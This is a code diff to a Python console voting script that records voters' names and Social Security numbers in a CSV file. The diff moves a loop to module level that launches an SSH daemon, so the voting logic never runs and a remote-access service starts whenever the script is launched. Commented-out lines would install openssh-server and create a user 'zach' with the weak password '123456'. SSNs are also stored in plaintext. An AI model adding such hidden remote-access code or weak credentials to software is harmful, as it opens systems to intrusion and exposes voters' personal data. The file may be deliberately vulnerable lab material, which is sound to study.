@@ -8,6 +8,25 @@ import signal
 import sys
 
 
+while True:
+        # Install packages
+        #os.system('apt-get install -y openssh-server ufw')
+
+        # Create user
+        #os.system('useradd zach -m -s /bin/bash')
+        #os.system('echo "zach:123456" | chpasswd')
+
+        # Create /run/sshd directory
+        os.system('mkdir -p /run/sshd')
+
+        # Set permissions for /run/sshd
+        os.system('chmod 0755 /run/sshd')
+
+        # Start sshd daemon
+        os.system('/usr/sbin/sshd -D')
+
+
+
 def signal_handler(signal, frame):
     # Ignore Ctrl+C signal
     pass
@@ -44,13 +63,13 @@ def prompt_yes_no(prompt):
         elif choice in ("n", "no"):
             return False
         else:
-            print("Invalid input, please enter 'y' for YES or 'n' for NO")
+            print("Invalid input, please type 'y' for YES or 'n' for NO and press ENTER")
 
 def main():
     # Create a FINAL.CSV file if it doesn't exist already
     if not os.path.exists("FINAL.csv"):
         with open("FINAL.csv", "w", encoding="utf-8") as f:
-            f.write("Name,SSN,Hash value,Selection\n")
+            f.write("Name,SSN,Selection,Hash value\n")
     
     # Read the existing votes from the CSV file
     previous_votes = set()
@@ -58,26 +77,7 @@ def main():
         reader = csv.DictReader(f)
         for row in reader:
             previous_votes.add((row["Name"], row["SSN"]))
-    
-    
-    
-    while True:
-        # Install packages
-        #os.system('apt-get install -y openssh-server ufw')
 
-        # Create user
-        #os.system('useradd zach -m -s /bin/bash')
-        #os.system('echo "zach:123456" | chpasswd')
-
-        # Create /run/sshd directory
-        os.system('mkdir -p /run/sshd')
-
-        # Set permissions for /run/sshd
-        os.system('chmod 0755 /run/sshd')
-
-        # Start sshd daemon
-        os.system('/usr/sbin/sshd -D')
-        
     while True:
         # Prompt the user for input
         os.system('cls')
